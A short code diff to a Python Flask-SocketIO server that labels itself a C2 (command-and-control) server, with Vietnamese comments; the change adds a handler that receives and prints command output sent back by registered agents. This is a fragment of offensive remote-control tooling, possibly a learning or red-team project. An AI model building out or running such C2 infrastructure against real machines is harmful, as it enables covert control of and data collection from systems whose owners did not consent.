@@ -34,6 +34,15 @@ def handle_register(data):
         # gui tin hieu xac nhan cho agent: "ok, server da xac nhan"
         emit('server_ack', {'status': 'registered', 'message': 'Welcome to C2'})
 
+# lang nghe de nhan command output tu agent
+@socketio.on('command_result')
+def handle_command_result(data):
+    agent_id = data.get('agent_id')
+    result = data.get('result')
+    
+    print(f"[*] received result from [{agent_id}]:")
+    print(result)
+
 if __name__ == '__main__':
     print("[*] Starting C2 Server with WebSockets...")
     socketio.run(app, port=80, debug=True)
